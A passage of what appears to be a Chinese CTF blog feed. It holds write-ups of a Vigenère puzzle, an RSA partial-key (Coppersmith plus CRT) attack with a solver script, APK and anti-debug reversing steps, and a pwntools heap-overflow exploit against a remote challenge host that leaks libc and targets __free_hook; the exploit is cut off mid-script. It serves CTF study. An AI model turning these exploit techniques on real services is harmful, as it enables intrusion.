gh huk wixdf ce oks ijggrtk-dtq uqvketbxkq sulnwsvwbtj. Taw fssoeimaqb sutulwu gbrvlr gp huk towwu hugk htng prke ulwf tbx teglwfvkj th wpoorv sxutsg ifmfmpwpgkihf. Dig iiyilquegghr fqknjryl wpqbsgalkgg zath fgts gnrn mzkg: vz uetdu kvzy mxujoaojml xqf rtjukapu vtkezjkhl, zvcafkehkj fhj glpnrnzapu fktrxl msly, grhlqqbrj fhj cignvnmaeogoeg nkgff, kcevltcaot anuvwbtj agv gzrikihfu, rvmzttd eofn, rnw eqfr. Cztagwh nzkefhvwam ko ijqjvjv a vgodykke vzcfnikekabogofn, pw ychru stq vvnz dowwtb pxppmgifnvyy bfxcybvs mzg ggauy hx oognvmtlkqnr kevzpwdavs ygt grilrbfi rvmzttd kbsuimtlkca, ypsmwog, ntu dbkvfvhltxv eczvlttlkcay rgtapgg guvxjuoeorl tlvopqj. CgZqbtQv&#123;3ayuc4r633096o2737&#125;\n</code></pre>\n<p>直接维吉尼亚枚举</p>\n<pre><code>The Concise Oxford English Dictionary defines cryptography as “the art of writing or solving codes.” This is historically accurate, but does not capture the current breadth of the field or its present-day scientific foundations. The definition focuses solely on the codes that have been used for centuries to enable secret communication. But cryptography nowadays encompasses much more than this: it deals with mechanisms for ensuring integrity, techniques for exchanging secret keys, protocols for authenticating users, electronic auctions and elections, digital cash, and more. Without attempting to provide a complete characterization, we would say that modern cryptography involves the study of mathematical techniques for securing digital information, systems, and distributed computations against adversarial attacks. CnHongKe&#123;3afca4d633096b2737&#125;\n</code></pre>\n<p>真 lao</p>\n<h1 id=\"高位截肢\"><a class=\"anchor\" href=\"#高位截肢\">#</a> 高位截肢</h1>\n<p>題目源代碼</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag&#123;********************************&#125;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getprime</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        n <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">while</span> n<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> bits<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            n <span class=\"token operator\">*=</span> next_prime<span class=\"token punctuation\">(</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">=</span> getprime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>q <span class=\"token operator\">=</span> getprime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>mod <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">[</span>mod<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getprime<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">[</span>res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>c<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">>></span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>output:</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414288774195411449434676147898363218552160256</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841)]</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>[17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730)]</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>高位攻擊恢復 p+crt<br />\n 給大家推薦幾個高位攻擊回復 p 的 blog<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc3RuZXJ2L2FydGljbGUvZGV0YWlscy8xMDYwMDkxMjc=\">https://blog.csdn.net/lostnerv/article/details/106009127</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lNDA3YmUzOWEyMmI=\">https://www.jianshu.com/p/e407be39a22b</span></p>\n<p>上脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>#高位p</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e = 65537</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n = 3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pbar = 36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits = 128</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>print(\"upper %d bits (of %d bits) is given\" % (pbar.nbits()-kbits, pbar.nbits()))</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>PR.&lt;x> = PolynomialRing(Zmod(n))</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>f = x + pbar</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor >= n^0.4</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p = x0 + pbar</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>print(\"p:\", p)</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>#crt求c</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>crt([17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730],[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841])</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">1077233712188252453962763215420078090384941182152999954278038468778840824135535740613334922110769959923025621861732351020130627648669752220543773285487384058164614139587422610914396593954389899763791857297268825420364912075493471765126196898848111738107851858382589951634394904231520912326280908229934082041817</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag{5bb5e0a9d48f44a3770253875f263810}<br />\n<img data-src=\"/img/CRYPTO/gaowei1.jpg\" alt=\"avatar\" /></p>\n",
            "tags": [
                "computer-science",
                "Crypto"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Web/Web/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Web/Web/",
            "title": "web学习",
            "date_published": "2021-12-06T07:07:04.092Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h1>\n",
            "tags": [
                "computer-science",
                "Web"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Reverse/reverse/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Reverse/reverse/",
            "title": "学习Reverse",
            "date_published": "2021-12-06T07:04:56.064Z",
            "content_html": "<p>2021/10/21 更新了 REVERSE1-schoolboy.apk</p>\n<h1 id=\"antidebug\"><a class=\"anchor\" href=\"#antidebug\">#</a> Antidebug</h1>\n<p>使用 resource hacker 获得输入框的 id：<br />\n<img data-src=\"/img/reverse/antidebug1.jpg\" alt=\"avatar\" /></p>\n<p>用 ida 搜索立即数，可以搜索 0x3e8  可以直接搜索 1000：<br />\n<img data-src=\"/img/reverse/antidebug2.jpg\" alt=\"avatar\" /></p>\n<p>双击找到调用位置:<br />\n 发现有 jz 和 jnz 跳转到相同位置，初步怀疑这里有花指令影响了 ida 的正常运行：<br />\n<img data-src=\"/img/reverse/antidebug3.jpg\" alt=\"avatar\" /></p>\n<p>key path -&gt; Fill range 全部 pathc 为 nop。注意 00401524 是个多字节指令，先使用快捷键 d 转为数据，将 00401524patch 为 0x90 后，再将后边的使用快捷键 c 转为代码：<br />\n<img data-src=\"/img/reverse/antidebug4.jpg\" alt=\"avatar\" /></p>\n<p>在找到函数开始的位置 push ebp 的地方，右键 create function<br />\nF5 可以看到是固定判断，只要输入的值是 0xABCDDCBA  ，那也就是个数字了。<br />\n即 2882395322 就可以了。<br />\n<img data-src=\"/img/reverse/antidebug5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"reverse1-schoolboyapk\"><a class=\"anchor\" href=\"#reverse1-schoolboyapk\">#</a> REVERSE1-schoolboy.apk</h1>\n<p>REVERSE1-schoolboy.apk<br />\nApk 文件反編譯<br />\n用一些 jeb jadx apkIDE 都可以<br />\n Jeb 和 apkIDE 搜索方便一點<br />\n Jadx 快一點</p>\n<p>我用的 apkIDE 和 jeb<br />\n 搜索 mainactivity<br />\n<img data-src=\"/img/reverse/reverseschoolboy1.jpg\" alt=\"avatar\" /></p>\n<p>反編譯<br />\n<img data-src=\"/img/reverse/reverseschoolboy2.jpg\" alt=\"avatar\" /></p>\n<p>找到主要内容<br />\n Id 號為 0x7F0E005D<br />\nGetStrings 方法<br />\n<img data-src=\"/img/reverse/reverseschoolboy3.jpg\" alt=\"avatar\" /></p>\n<p>用 smail 全局搜索 id 號得到<br />\n<img data-src=\"/img/reverse/reverseschoolboy4.jpg\" alt=\"avatar\" /></p>\n<p>Id 號為<br />\n<img data-src=\"/img/reverse/reverseschoolboy5.jpg\" alt=\"avatar\" /></p>\n<p>在 mysecret 裏面<br />\n搜索 strings.xml<br />\nresources.arsc-res-values-strings.xml<br />\n<img data-src=\"/img/reverse/reverseschoolboy6.jpg\" alt=\"avatar\" /></p>\n<p>找到 mysecret<br />\n<img data-src=\"/img/reverse/reverseschoolboy7.jpg\" alt=\"avatar\" /></p>\n<p>EBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P<br />\n 看上去像加密的<br />\n寫脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">\"REBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>b <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p a192862aa3bf46dffb57b12bdcc4c199=\"\"><img data-src=\"/img/reverse/reverseschoolboy8.jpg\" alt=\"avatar\" /><br />\n 直接出<br />\n flag:<br />\nDASCTF</p>\n",
            "tags": [
                "computer-science",
                "Reverse",
                "CTF",
                "Reverse"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn2/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn2/",
            "title": "pwn学习(2)",
            "date_published": "2021-12-06T07:00:39.056Z",
            "content_html": "<h1 id=\"记录两个堆的比赛题\"><a class=\"anchor\" href=\"#记录两个堆的比赛题\">#</a> 记录两个堆的比赛题</h1>\n<p>比较穷网盘没有会员附件私聊我</p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<p><img data-src=\"/img/PWN/zhiye2.png\" alt=\"avatar\" /></p>\n<p><img data-src=\"/img/PWN/zhiye.png\" alt=\"avatar\" /><br />\n 堆溢出<br />\n感觉比较基础<br />\n堆溢出改大小制造重叠堆块</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#io=process('./pwn1')</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'119.61.19.212'</span><span class=\"token punctuation\">,</span><span class=\"token number\">57511</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#libc=elf.libc</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x481</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tmalloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tdele<span class=\"token 